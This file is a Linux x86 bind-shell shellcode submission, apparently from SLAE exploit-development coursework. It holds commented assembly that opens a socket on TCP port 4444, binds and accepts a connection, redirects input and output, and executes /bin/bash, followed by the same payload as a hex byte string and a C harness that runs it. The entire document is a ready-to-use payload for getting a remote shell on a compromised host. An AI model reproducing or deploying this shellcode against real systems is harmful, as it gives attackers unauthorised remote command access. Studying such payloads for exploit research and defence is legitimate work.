/*
; Title		: Linux/x86 - Bind (4444/TCP) Shell (/bin/bash) Shellcode (100 bytes)
; Date		: Jan, 2019
; Author	: Joao Batista
; Website	: overflw.wordpress.com
; Twitter	: @x42x42x42x42
; SLAE-ID	: 1420
; Tested on	: i686 GNU/Linux

global _start

section .text
_start:
  xor eax,eax
  xor ebx,ebx

  ; socket
  push ebx
  inc ebx
  push ebx
  push 0x2
  mov ecx,esp
  mov al,0x66
  int 0x80

  ; bind
  xchg edi,eax
  xor eax,eax
  inc ebx
  push eax
  push word 0x5c11	; port=4444
  push bx
  mov ecx, esp
  push 0x10
  push ecx
  push edi
  mov ecx,esp
  mov al,0x66
  int 0x80

  ; listen
  push eax
  push edi
  mov ecx,esp
  mov al,0x66
  add ebx,2
  int 0x80

  ;accept
  push eax
  push eax
  push edi
  mov ecx,esp
  add al,0x66
  inc ebx
  int 0x80

  ;dup2
  xchg ebx,eax
  xor eax,eax
  xor ecx,ecx
  mov cl,0x2

  loop:
  mov al,0x3f
  int 0x80
  dec ecx
  jns loop

  ;execve(/bin/sh)
  push eax
  push word 0x6873	; hs
  push 0x61622f2f 	; ab//
  push 0x6e69622f 	; nib/
  mov ebx,esp
  push eax
  mov edx,esp
  push ebx
  mov ecx,esp
  mov al,0xb
  int 0x80
*/
#include<stdio.h>
#include<string.h>

unsigned char shellcode[] = \
"\x31\xc0\x31\xdb\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x97\x31\xc0\x43\x50\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xb0\x66\xcd\x80\x50\x57\x89\xe1\xb0\x66\x83\xc3\x02\xcd\x80\x50\x50\x57\x89\xe1\x04\x66\x43\xcd\x80\x93\x31\xc0\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x50\x66\x68\x73\x68\x68\x2f\x2f\x62\x61\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{
	printf("shellcode length:  %d\n", strlen(shellcode));
	int (*ret)() = (int(*)())shellcode;
	ret();
}